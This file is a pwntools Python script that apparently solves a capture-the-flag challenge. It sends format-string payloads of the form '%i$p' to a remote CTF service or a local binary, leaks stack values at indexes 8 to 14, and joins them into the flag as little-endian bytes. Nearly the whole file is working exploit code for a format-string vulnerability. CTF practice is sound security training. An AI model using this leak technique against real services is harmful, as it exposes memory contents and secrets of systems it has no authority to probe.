from pwn import*
context.arch="amd64"
context.terminal="kitty" #adjust this with ur terminal or comment/remove the line
b="./main"
#l = libc = ELF("./libc.so.6")
elf = e = context.binary = ELF(b)
DEBUG=0 # 0 remote , 1 local , 2 local + gdb
nc="nc ctf.taz.tn 10005"
r=nc.split(" ")
flag=b""
for i in range(8,15):
    # connect to target (local/remote depending on DEBUG)
    if DEBUG==1:
        p=process(b)
    elif DEBUG==2:
        p=process(b)
        gdb.attach(p,"""
        """)
    else:
        p=remote(r[1],int(r[2]),ssl=False)

    # Use format-string leaks: try several stack indexes to find pointers
    p.recvline()
    p.sendline(f"%{i}$p")
    data = p.recvline()[:-1]
    # If the slot is not NULL, convert hex string to integer and pack to 8 bytes
    if data != b"(nil)":
        # convert leaked pointer (hex string) to 64-bit little endian ( readable letters )
        print(p64(int(data,16)))
        flag += p64(int(data,16))
    p.close()

print(flag)
# The script previously prints a constructed flag by concatenating leaked pointers
p.interactive()
